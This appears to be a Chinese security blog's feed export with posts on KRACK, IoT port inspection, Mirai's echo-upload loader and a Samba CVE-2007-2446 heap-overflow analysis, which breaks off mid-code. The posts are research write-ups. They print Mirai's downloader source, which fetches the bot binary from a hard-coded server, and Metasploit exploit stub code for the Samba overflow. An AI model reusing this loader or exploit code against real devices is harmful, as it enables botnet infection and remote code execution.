<p>最常见的场景是用户密码的存储，CSDN明文存储，泄露的危害大家都很有感受，Adobe1.5亿数据，是加密的，不知道密钥是否被泄露了，至少密钥没有被公开，这就大大的减少了这个数据泄露的危害。当然Adobe的加密方式并不是最佳实践。如果一个好的设计可以保证密码数据泄露之后无法使用，这样的一个防御设计能力应该是后面所说的正向能力吧。</p>
<p>关于IOT的安全也是很有趣，虽然很多系统重在保护数据，但是iot的控制权是可以影响safety的，所以iot的控制权争夺是最为重要的。</p>
<p>小结：安全要搞清楚保护的对象是什么，而这些对象也随着产业发展不断变化。“EIP”控制权的争夺应该更多的面向与物理世界相连的设备，而其它的场景，则应该重点关注“数据”的控制权。数据已经成为DT时代的石油，是产生价值的新能源，如果还是用传统的漏洞思维来谈数据安全，是肯定做不好的，密码学久违的春天已经到了。</p>
<p>这个观点是最超出以前认知的观点。</p>
<h2 id="重视反向能力，轻视正向能力">重视反向能力，轻视正向能力</h2><p>这里提出了反反向能力和正向能力的概念，也是感觉学习到了。</p>
<h2 id="参考资料">参考资料</h2><p><a href="https://mp.weixin.qq.com/s/eayCCAnfBW8LNEhDn5A0nw" target="_blank" rel="external">https://mp.weixin.qq.com/s/eayCCAnfBW8LNEhDn5A0nw</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;总的来说是了解到两个新的观念，一个是iot的设备应该更多考虑eip的控制权，其他场景需要考虑数据的控制权，保护数据的控制权并不一定等同于保护相关系统的eip控制权。再一个是反反向能力和正向能力的概念。&lt;/p&gt;
&lt;h2 id=&quot;重视攻，轻视防&quot;&gt;重视攻，轻视防&lt;/h2&gt;&lt;p&gt;
    
    </summary>
    
      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
    
    
  </entry>
  
  <entry>
    <title>wpa krack 漏洞学习</title>
    <link href="http://xdxd.love/2018/01/31/wpa-krack-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://xdxd.love/2018/01/31/wpa-krack-漏洞学习/</id>
    <published>2018-01-31T09:58:52.000Z</published>
    <updated>2018-01-31T10:08:45.589Z</updated>
    
    <content type="html"><![CDATA[<p>网上已经有不少的分析文章，也有分析的比较好的文章。由于这是一系列漏洞，多个CVE，而且涉及到不了解的WPA协议。所以一开始看起来感觉有些无法掌控。其实这里主要掌握的知识点一个是WPA的4次握手协议。</p>
<p>先看一下WPA的4次握手。4次握手主要有两个作用，一个是完成了客户端和服务端的双向身份认证，同时进行了密钥交换。确定了通信密钥。</p>
<p>简单点说是以个基于共享密钥的身份认证和密钥交换协议。在网上找到一个华为的专利<a href="https://www.google.com/patents/CN1534935A?cl=zh" target="_blank" rel="external">一种基于预共享密钥的密钥分发方法</a>。本质上是使用了<a href="https://zh.wikipedia.org/wiki/%E8%AF%A2%E9%97%AE%E6%8F%A1%E6%89%8B%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE" target="_blank" rel="external">基于挑战的身份认证</a></p>
<h2 id="认证">认证</h2><p>通常登录一个web应用的时候，是直接将密码发送到服务器进行验证的。类似于下图这样。</p>
<p><img src="/images/krack1.png" alt=""></p>
<p>但是wifi这个场景如果直接发送明文密码给服务器，就会直接导致密码的泄露了。</p>
<p>所以有了基于挑战的身份认证方式：<br><img src="/images/krack2.png" alt=""></p>
<p>ap下发一个随机数(挑战)给sta，sta生成一个随机数B，sta对两个随机数加上pwd1做hmac，将hmac的结果和随机数B发给ap。ap收到之后按照同样的算法做hmac，如果结果相同，则认为sta具有跟ap一样的密码。sta的认证通过。同理，ap将自己hmac的结果发给sta，sta对比一致确认ap具有同样的密码，这样就完成了双向的身份认证。整个过程中没有密码的传输，只有hmac。</p>
<h2 id="wpa的4次握手">wpa的4次握手</h2><p>wpa的4次握手就是上图的一个工程实践，基本原理一致。</p>
<p><img src="/images/krack3.png" alt=""></p>
<p>具体可以参考论文的4次握手部分。</p>
<p>4次握手抓包分析：</p>
<p><img src="/images/krack4.png" alt=""></p>
<h2 id="密钥重装漏洞">密钥重装漏洞</h2><p>这个漏洞的一个简单点的利用模型就是重放message3，导致sta重新install这个message3对应的密钥。本来sta每次连接经过4次握手之后都会生成不一样的临时密钥，由于重放导致使用了之前使用过的密钥进行数据加密传输。</p>
<p>使用同样的密钥导致的问题在论文中只是说可导致数据被解密，并没有详细描述。可能是属于密码学中比较基本部分。但是我一开始也不是很理解。经过一些学习，应该是类似<a href="http://jasonye.xyz/2016/03/17/stream-cipher-xor/" target="_blank" rel="external">流加密算法XOR解密</a><br>这样一些攻击收到导致数据被解密。而全零的这个bug才是一个真正比较有真实利用价值的高危漏洞。adlab的<a href="https://paper.seebug.org/512/" target="_blank" rel="external">WPA2 “KRACK”漏洞简介与重现</a>对密钥重装的过程和全零漏洞的分析比较清晰。</p>
<h2 id="参考资料">参考资料</h2><p><a href="https://paper.seebug.org/512/" target="_blank" rel="external">https://paper.seebug.org/512/</a><br><a href="http://jasonye.xyz/2016/03/17/stream-cipher-xor/" target="_blank" rel="external">http://jasonye.xyz/2016/03/17/stream-cipher-xor/</a><br><a href="http://www.cnblogs.com/wsine/p/5608975.html" target="_blank" rel="external">http://www.cnblogs.com/wsine/p/5608975.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网上已经有不少的分析文章，也有分析的比较好的文章。由于这是一系列漏洞，多个CVE，而且涉及到不了解的WPA协议。所以一开始看起来感觉有些无法掌控。其实这里主要掌握的知识点一个是WPA的4次握手协议。&lt;/p&gt;
&lt;p&gt;先看一下WPA的4次握手。4次握手主要有两个作用，一个是完成
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>物联网设备查看开放端口对应的进程</title>
    <link href="http://xdxd.love/2018/01/29/%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E6%9F%A5%E7%9C%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%BA%94%E7%9A%84%E8%BF%9B%E7%A8%8B/"/>
    <id>http://xdxd.love/2018/01/29/物联网设备查看开放端口对应的进程/</id>
    <published>2018-01-29T06:29:29.000Z</published>
    <updated>2018-01-30T01:27:03.431Z</updated>
    
    <content type="html"><![CDATA[<h2 id="场景">场景</h2><p>linux下查看开放的端口，其实只需要一个命令就可以了。<code>netstat -atnp</code><br><img src="/images/netstat1.png" alt=""><br>但是在不少物联网网设备上，采用busybox，netstat没有p参数。或者干脆没有netstat命令。<br><img src="/images/netstat2.png" alt=""></p>
<h2 id="解决方案">解决方案</h2><p>1，第一个想法是是否可以下载一个带p参数的netstat命令使用。<br>2，fuser命令 发现这个场景下fuser可能 返回空。。<br><img src="/images/netstat3.png" alt=""></p>
<p>3，使用/proc/net/tcp中的信息。这个文件之前在http<a href="http://xdxd.love/2016/05/23/%E4%B8%80%E4%B8%AA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">一个任意文件读取漏洞分析</a> 中讲过。</p>
<p>查看 /proc/net/tcp 获取端口对应的inode号，端口为16进制，比如端口17998 对应0x464E</p>
<p><code>cat /proc/net/tcp | grep     464E</code></p>
<pre><code><span class="number">6</span>: C0A80101:<span class="number">464</span>E <span class="number">00000000</span>:<span class="number">0000</span> <span class="number">0</span>A <span class="number">00000000</span>:<span class="number">00000000</span> <span class="number">00</span>:<span class="number">00000000</span> <span class="number">00000000</span>     <span class="number">0</span>        <span class="number">0</span> <span class="number">3956</span> <span class="number">1</span> <span class="number">8</span>b7df330 <span class="number">99</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10</span> -<span class="number">1</span>
</code></pre><p>获得对应的inode号为3956</p>
<pre><code><span class="keyword">for</span> dir <span class="keyword">in</span> `find /<span class="keyword">proc</span>/ -name <span class="string">"fd"</span>`; <span class="keyword">do</span> ls -l $dir | grep 'socket\:\[<span class="number">3956</span>' &amp;&amp; echo $dir;done  
</code></pre><p><img src="/images/netstat3.png" alt=""></p>
<p>获得对应的进程为3304</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;场景&quot;&gt;场景&lt;/h2&gt;&lt;p&gt;linux下查看开放的端口，其实只需要一个命令就可以了。&lt;code&gt;netstat -atnp&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;/images/netstat1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;但是在不少物联网网设备上，采用bu
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
      <category term="万物互联" scheme="http://xdxd.love/tags/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title>mirai的echo上传文件机制分析</title>
    <link href="http://xdxd.love/2017/12/26/mirai%E7%9A%84echo%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2017/12/26/mirai的echo上传文件机制分析/</id>
    <published>2017-12-26T08:59:19.000Z</published>
    <updated>2018-01-08T08:35:46.790Z</updated>
    
    <content type="html"><![CDATA[<p>物联网设备系统资源有限，所以操作系统都会进行精简。之前在乌云看到对某个智能设备木马的分析，其中采用了使用echo写16进制，写一个简单的wget到设备上。可见这个思路在很早之前就已经被广泛使用了。最近在分析智能设备的过程中，也遇到了同样的问题，想要传一个gdbserver到设备上，但是没有wget之类下载工具，只能采用echo的方式。从想法到实际上完成还是经过了一些尝试。</p>
<h2 id="Mirai的echo上传文件机制">Mirai的echo上传文件机制</h2><p>针对Mirai已经有了不少的分析文章，大多集中在分析bot的功能，对echo的上传的文件的方式也有提及。但是缺少一些能在实际项目中应用的细节。下面截图出自RSA会议的截图。</p>
<p><img src="/images/miraiecho1.png" alt=""></p>
<p>Mirai在源码中定义了3中下载bot的方式。</p>
<p><img src="/images/miraiecho2.png" alt=""></p>
<p>显然，echo的方式是最通用的。通过直接16进制到文件。</p>
<h2 id="Mirai的tools目录">Mirai的tools目录</h2><p>接下来只要搞定echo哪个文件就可以了，直接echo一个大文件显然是不现实的，需要找一个有下载文件功能的足够小的程序。首先关注到的是Mirai的tools的文件夹。显然wget.c应该是下载文件用的。</p>
<p>下图是绿盟科技在<a href="http://blog.nsfocus.net/mirai-source-analysis-report/" target="_blank" rel="external">Mirai源码分析报告</a>的截图。不过他这里有个小失误，wget确实是下载文件用的。但是作者在测试的时候，直接运行的wget命令，显然是操作系统自带的wget工具。</p>
<p><img src="/images/miraiecho3.png" alt=""></p>
<p>mirai的wget的命令格式为： wget ip_address remote_file host</p>
<p><img src="/images/miraiecho4.png" alt=""></p>
<p><img src="/images/miraiecho5.png" alt=""></p>
<p>经过测试，发现指定-static参数之后，这个wget大小也有几百K。放在那跑了一晚上，第二天一看设备挂掉了。。。。</p>
<h2 id="Mirai_echo_upload使用的文件">Mirai echo upload使用的文件</h2><p>mirai使用echo方式上传的时候，首先上传一个很小的文件，用于下载mirai。大小为1K左右。目录为dlr<br><img src="/images/miraiecho6.png" alt=""></p>
<p>大部分分析文章都忽略了这个文件夹。其中，main.c是源码，build.sh是编译脚本，release是编译完成的2进制文件。</p>
<p>先看一下build.sh<br><img src="/images/miraiecho7.png" alt=""></p>
<p>可以看到他采用了一些优化的手段来减少最终的文件的大小。经过strip之后，文件体积大致为原来的一半左右。</p>
<p>main.c中下载的地址都是写死的，编译之前需要修改ip和文件名。</p>
<pre><code>    <span class="preprocessor">#<span class="keyword">define</span> HTTP_SERVER utils_inet_addr(<span class="number">127</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">// CHANGE TO YOUR HTTP SERVER IP</span></span>

<span class="preprocessor">#<span class="keyword">ifdef</span> DEBUG</span>
<span class="built_in">printf</span>(<span class="string">"Connected to host\n"</span>);
<span class="preprocessor">#<span class="keyword">endif</span></span>

<span class="keyword">if</span> (write(sfd, <span class="string">"GET /bins/mirai."</span> BOT_ARCH <span class="string">" HTTP/1.0\r\n\r\n"</span>, <span class="number">16</span> + arch_strlen + <span class="number">13</span>) != (<span class="number">16</span> + arch_strlen + <span class="number">13</span>))
{
<span class="preprocessor">#<span class="keyword">ifdef</span> DEBUG</span>
<span class="built_in">printf</span>(<span class="string">"Failed to send get request.\n"</span>);
<span class="preprocessor">#<span class="keyword">endif</span></span>
以及增加
<span class="preprocessor">#<span class="keyword">define</span> DEBUG </span>
</code></pre><p>用来输出调试信息。</p>
<h2 id="编译方式">编译方式</h2><p>参考<a href="https://paper.seebug.org/papers/Archive/Mirai%E6%9C%A8%E9%A9%AC%E6%80%BB%E7%BB%93%E2%80%94%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%8D%E6%B1%87%E7%BC%96.pdf" target="_blank" rel="external">Mirai木马总结—从源码到反汇编</a></p>
<h2 id="python操作串口">python操作串口</h2><p>代码实现也有遇到一些问题，比如一次写多少个字节效率最高。mirai是一次写128个字节。</p>
<p><img src="/images/miraiecho8.png" alt=""></p>
<p>具体代码关注公众号获取~~</p>
<h2 id="遇到的坑：">遇到的坑：</h2><p>1，mac上输入串口密码的问题<br>2，文件的大小端?<br>3,   不明原因的卡死<br>4, 长时间写串口把设备写重启。<br>5，cc1: error: main.c: Value too large for defined data type<br>磁盘mount的问题。在docker挂载的目录中编译导致的，直接copy到docker里面编译即可。<br><a href="https://stackoverflow.com/questions/2438890/cc1plus-error-include-value-too-large-for-defined-data-type-when-compiling-wi" target="_blank" rel="external">https://stackoverflow.com/questions/2438890/cc1plus-error-include-value-too-large-for-defined-data-type-when-compiling-wi</a><br>6,编译版本的问题导致illegial instruction</p>
<p>mirai编译的文档中只有armv4,armv5,armv6的版本，但是给出的bin中却有v7的版本，在我使用的设备上，只有v7是可以执行的，其他都是报非法的指令错误。使用<a href="https://github.com/dockcross/dockcross" target="_blank" rel="external">https://github.com/dockcross/dockcross</a> 编译成功。</p>
<p>7，gdbserver编译 <a href="https://github.com/mzpqnxow/gdb-static-cross" target="_blank" rel="external">https://github.com/mzpqnxow/gdb-static-cross</a></p>
<p>参考资料：</p>
<p><a href="http://blog.nsfocus.net/mirai-source-analysis-report/" target="_blank" rel="external">http://blog.nsfocus.net/mirai-source-analysis-report/</a><br><a href="http://www.freebuf.com/articles/terminal/117927.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/117927.html</a><br><a href="https://xmsg.org/wordpress/2016/12/mirai%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90ppt-%E5%88%86%E6%9E%90%E4%BA%86mirai-ddos%E7%89%B9%E6%80%A7-%E5%B9%B6%E7%BB%99%E5%87%BA%E4%BA%86mirai-ddos%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/" target="_blank" rel="external">https://xmsg.org/wordpress/2016/12/mirai%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90ppt-%E5%88%86%E6%9E%90%E4%BA%86mirai-ddos%E7%89%B9%E6%80%A7-%E5%B9%B6%E7%BB%99%E5%87%BA%E4%BA%86mirai-ddos%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/</a><br><a href="http://www.nolanzong.com/2017/01/09/mirai-setup/" target="_blank" rel="external">http://www.nolanzong.com/2017/01/09/mirai-setup/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;物联网设备系统资源有限，所以操作系统都会进行精简。之前在乌云看到对某个智能设备木马的分析，其中采用了使用echo写16进制，写一个简单的wget到设备上。可见这个思路在很早之前就已经被广泛使用了。最近在分析智能设备的过程中，也遇到了同样的问题，想要传一个gdbserver到
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>samba cve-2007-2446 堆溢出分析</title>
    <link href="http://xdxd.love/2017/11/09/samba-cve-2007-2446-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2017/11/09/samba-cve-2007-2446-堆溢出分析/</id>
    <published>2017-11-09T11:09:15.000Z</published>
    <updated>2017-11-10T07:03:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前翻译的<a href="http://xdxd.love/2017/10/16/netgear-WNR2200%E7%9A%84%E4%B8%80%E4%B8%AAheap-overflow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">【翻译】netgear WNR2200的一个heap overflow漏洞利用</a>文中讲解samba堆溢出的利用。其实利用的漏洞是cve-2007-2446中的一个堆溢出漏洞。但是并没有详细讲解漏洞的成因以及具体的exploit调试过程。这个漏洞也比较早了，网上并没有详细的漏洞分析，只能找到cve的相关描述信息。所以这里为了学习的目的从代码层面分析一下这个漏洞和相关exploit的原理。</p>
<p><a href="https://www.samba.org/samba/security/CVE-2007-2446.html" target="_blank" rel="external">CVE-2007-2446: Multiple Heap Overflows Allow Remote Code Execution</a>包括5个不同的堆溢出漏洞，metasploit中的exploit利用的是lsa_io_trans_names函数中的那个漏洞。</p>
<p><img src="/images/cve200724461.png" alt=""></p>
<h2 id="补丁分析">补丁分析</h2><p>根据现有信息可以找到github上，samba修补这个漏洞的代码。<a href="https://github.com/samba-team/samba/commit/d34f6bb969092166c961e328229b1b05a30f6930#diff-7f3eb313a21e6237196fd7c6c1efc487" target="_blank" rel="external">r22852: merge fixes for CVE-2007-2446 and CVE-2007-2447 to all branches</a></p>
<p>根据漏洞描述可以定位到如下代码。</p>
<p><img src="/images/cve200724462.png" alt=""></p>
<p>最终可以确定，lsa_io_trans_names里的堆溢出补丁为：</p>
<p>增加</p>
<pre><code><span class="keyword">if</span> (trn<span class="subst">-&gt;</span>num_entries2 != trn<span class="subst">-&gt;</span>num_entries) { 

<span class="comment">/* RPC fault */</span>
<span class="keyword">return</span> <span class="literal">False</span>; 
} 
</code></pre><p>增加了num_entries2和num_entries的比较，如果不相同，就返回false，避免继续执行。后面的PRS_ALLOC_MEM函数中的num_entries参数修改为了num_entries2。按照漏洞产生的原理来看，前面判断了num_entries和num_entries2相等才会进入后面的逻辑，所以这里既是不改对程序的运行结果也是不影响的。</p>
<p>根据漏洞描述，猜测漏洞成因是先根据num_entries分配堆内存大小，然后写入数据的时候根据num_entries2来写入数据，如果num_entries2大于num_entries就会导致溢出，堆上数据被覆盖。而num_entries和num_entries2都是用户可控的数据。</p>
<h2 id="源码分析和动态调试">源码分析和动态调试</h2><p>猜测 PRS_ALLOC_MEM是分配内存的函数，跟进源码：</p>
<pre><code><span class="comment">#define PRS_ALLOC_MEM(ps, type, count) (type *)prs_alloc_mem_((ps),sizeof(type),(count))</span>

char <span class="keyword">*</span>prs_alloc_mem_(prs_struct <span class="keyword">*</span>ps, size_t size, unsigned int count);


/<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
Allocate memory when unmarshalling... Always zero clears.
<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>/

<span class="comment">#if defined(PARANOID_MALLOC_CHECKER)</span>
char <span class="keyword">*</span>prs_alloc_mem_(prs_struct <span class="keyword">*</span>ps, size_t size, unsigned int count)
<span class="comment">#else</span>
char <span class="keyword">*</span>prs_alloc_mem(prs_struct <span class="keyword">*</span>ps, size_t size, unsigned int count)
<span class="comment">#endif</span>
{
    char <span class="keyword">*</span>ret = NULL;

    if (size) {
        /<span class="keyword">*</span> We can't call the type-safe version here. <span class="keyword">*</span>/
        ret = _talloc_zero_array(ps-&gt;mem_ctx, size, count, <span class="string">"parse_prs"</span>);
    }
    return ret;
}
/<span class="keyword">*</span>
alloc an zero array, checking for integer overflow in the array size
<span class="keyword">*</span>/
void <span class="keyword">*</span>_talloc_zero_array(const void <span class="keyword">*</span>ctx, size_t el_size, unsigned count, const char <span class="keyword">*</span>name)
{
    if (count &gt;= MAX_TALLOC_SIZE/el_size) {
        return NULL;
    }
    return _talloc_zero(ctx, el_size <span class="keyword">*</span> count, name);
}


/<span class="keyword">*</span>
talloc and zero memory.
<span class="keyword">*</span>/
void <span class="keyword">*</span>_talloc_zero(const void <span class="keyword">*</span>ctx, size_t size, const char <span class="keyword">*</span>name)
{
    void <span class="keyword">*</span>p = talloc_named_const(ctx, size, name);

    if (p) {
        memset(p, '\0', size);
    }

    return p;
}
</code></pre><p>分配内存，初始化为\0。使用netgear wnr2000的中samba进行动态调试分析。samba版本为3.0.24。使用metasploit中的auxiliary/dos/samba/lsa_transnames_heap进行验证。</p>
<p>抓取metasploit发送的数据包，可以看到最后一个smb协议的包如下：</p>
<p><img src="/images/cve200724463.png" alt=""></p>
<p>该metasploit模块的核心代码如下：</p>
<pre><code>print_status(<span class="string">"Connecting to the SMB service..."</span>)
connect()
smb_login()

datastore[<span class="string">'DCERPC::fake_bind_multi'</span>] = <span class="keyword">false</span>

handle = dcerpc_handle(<span class="string">'12345778-1234-abcd-ef00-0123456789ab'</span>, <span class="string">'0.0'</span>, <span class="string">'ncacn_np'</span>, [<span class="string">"\\#{pipe}"</span>])
print_status(<span class="string">"Binding to #{handle} ..."</span>)
dcerpc_bind(handle)
print_status(<span class="string">"Bound to #{handle} ..."</span>)

stub = lsa_open_policy(dcerpc)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">1</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0x20004</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0x100</span>)
stub &lt;&lt; (<span class="string">"X"</span> * <span class="number">16</span>) * <span class="number">0x100</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">1</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)

print_status(<span class="string">"Calling the vulnerable function..."</span>)
</code></pre><p>对比利用程序的源码/usr/share/metasploit-framework/modules/exploits/linux/samba/lsa_transnames_heap.rb 。</p>
<pre><code>stub = lsa_open_policy(dcerpc)

stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)            <span class="preprocessor"># num_entries</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)            <span class="preprocessor"># ptr_sid_enum</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(num_entries)  <span class="preprocessor"># num_entries</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0x20004</span>)      <span class="preprocessor"># ptr_trans_names</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(num_entries2) <span class="preprocessor"># num_entries2</span>
stub &lt;&lt; buf
stub &lt;&lt; nops
stub &lt;&lt; payload.encoded
</code></pre><p>以上代码来自exploit。根据注释可以假设，在dos module中num_entries值为1，num_entries值为100。</p>
<p>将smbd导入IDA，搜索function name，只能找到lsa_io_q_lookup_sids，根据源码，可以找到</p>
<pre><code>LOAD:<span class="number">76</span>DE2888                 addiu   $a0, (aNames - <span class="number">0x76F6C000</span>)  <span class="preprocessor"># <span class="string">"names  "</span></span>
LOAD:<span class="number">76</span>DE288C                 lw      $t9, -<span class="number">0x7F58</span>($gp)
LOAD:<span class="number">76</span>DE2890                 addiu   $t9, (sub_76DE248C - <span class="number">0x76DDC000</span>)
LOAD:<span class="number">76</span>DE2894                 jalr    $t9
</code></pre><p>处为调用lsa_io_trans_names。在76DE2888处下断点，跟进函数。</p>
<p>之后一路F8，来到PRS_ALLOC_MEM的调用处。</p>
<p><img src="/images/cve200724464.png" alt=""></p>
<p>查看寄存器传递的函数参数：</p>
<p><img src="/images/cve200724465.png" alt=""></p>
<p>$a2的值为1，这也确认了metasploit dos 模块中定义的num_entries值为1。</p>
<p>执行完分配内存，查看寄存器$v0获得返回的地址为：761AF208</p>
<p><img src="/images/cve200724466.png" alt=""></p>
<p>对比源代码：</p>
<pre><code><span class="keyword">if</span> (UNMARSHALLING(ps)) { 

<span class="keyword">if</span> ((trn-&gt;name = PRS_ALLOC_MEM(ps, LSA_TRANS_NAME, trn-&gt;num_entries2)) == <span class="keyword">NULL</span>) { 
<span class="keyword">return</span> <span class="keyword">False</span>; 
} 
<span class="keyword">if</span> ((trn-&gt;uni_name = PRS_ALLOC_MEM(ps, UNISTR2, trn-&gt;num_entries2)) == <span class="keyword">NULL</span>) { 
<span class="keyword">return</span> <span class="keyword">False</span>; 
} 
} 
<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; trn-&gt;num_entries2; i++) { 
fstring t; 
slprintf(t, sizeof(t) - <span class="number">1</span>, <span class="string">"name[%d] "</span>, i); 
<span class="keyword">if</span>(!lsa_io_trans_name(t, &amp;trn-&gt;name[i], ps, depth)) <span class="comment">/* translated name */</span>
<span class="keyword">return</span> <span class="keyword">False</span>; 
</code></pre><p>之后进入lsa_io_trans_name函数</p>
<pre><code>Reads or writes a LSA_TRANS_NAME structure.
<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>/
static BOOL lsa_io_trans_name(const char <span class="keyword">*</span>desc, LSA_TRANS_NAME <span class="keyword">*</span>trn, prs_struct <span class="keyword">*</span>ps, 
int depth) 
{ 
